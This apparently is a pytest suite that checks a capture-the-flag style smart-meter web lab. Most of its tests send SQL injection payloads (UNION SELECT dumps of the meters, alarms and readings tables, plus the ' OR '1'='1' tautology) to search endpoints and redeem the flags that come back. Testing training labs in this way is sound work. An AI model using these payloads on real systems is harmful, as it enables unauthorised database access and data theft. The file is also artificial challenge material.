

def test_sqli_teach_admin_meters(ops1_admin, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "zzz' UNION SELECT id,meter_code,user_id,nickname,status,balance,created_at,0,0,0 FROM meters--"
    resp = ops1_admin.get(f"{base_url}/admin/meters", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(ops1_admin, base_url, flag)


def test_sqli_exercise_admin_alarms(ops1_admin, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "zzz' UNION SELECT id,meter_id,type,message,created_at,0 FROM alarms--"
    resp = ops1_admin.get(f"{base_url}/admin/alarms", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(ops1_admin, base_url, flag)


def test_sqli_bonus_usage(alice, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "zzz' UNION SELECT reading_kwh, source, recorded_at FROM readings--"
    resp = alice.get(f"{base_url}/usage", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(alice, base_url, flag)


def test_sqli_boolean_bonus_usage(alice, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "' OR '1'='1' -- "
    resp = alice.get(f"{base_url}/usage", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(alice, base_url, flag)


def test_sqli_boolean_exercise_admin_alarms(ops1_admin, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "' OR '1'='1' -- "
    resp = ops1_admin.get(f"{base_url}/admin/alarms", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(ops1_admin, base_url, flag)


def test_alarm_search_keeps_internal_record_hidden(ops1_admin, base_url):
    """Ordinary searches, whatever they match, never surface the internal alarm."""
    for q in ("internal", "_", "WG", "SENTINEL", "tamper", ""):
        resp = ops1_admin.get(f"{base_url}/admin/alarms", params={"q": q}, timeout=10)
        assert resp.status_code == 200
        assert "FLAG{" not in resp.text, q
        assert "__WG_SENTINEL" not in resp.text, q


def test_alarm_union_and_boolean_award_different_flags(ops1_admin, base_url, extract_all_flags_fn):
    boolean = ops1_admin.get(f"{base_url}/admin/alarms", params={"q": "' OR '1'='1' -- "}, timeout=10)
    union = ops1_admin.get(
        f"{base_url}/admin/alarms",
        params={"q": "zzz' UNION SELECT id,meter_id,type,message,created_at,0 FROM alarms--"},
        timeout=10,
    )
    boolean_flags, union_flags = set(extract_all_flags_fn(boolean.text)), set(extract_all_flags_fn(union.text))
    assert len(boolean_flags) == 1 and len(union_flags) == 1
    assert boolean_flags != union_flags
